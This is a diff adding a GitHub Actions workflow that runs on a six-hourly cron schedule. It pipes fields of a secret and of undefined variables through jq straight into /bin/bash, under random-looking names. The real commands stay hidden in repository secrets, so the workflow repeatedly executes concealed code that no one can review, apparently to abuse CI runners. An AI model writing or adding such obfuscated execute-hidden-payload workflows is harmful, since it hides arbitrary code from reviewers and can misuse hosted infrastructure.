@@ -1,0 +1,19 @@
+name: holylishit
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: holylishit
+        env:
+          kdt57: ${{ secrets.kdt57 }}
+        run: |
+          echo $kdt57 | jq -r .y23760 | /bin/bash
+          echo $xcalx1464 | jq -r .mwxot5 | /bin/bash
+          echo $o57604 | jq -r .xnwqf74116 | /bin/bash
+          echo $f92095 | jq -r .rct15 | /bin/bash
+
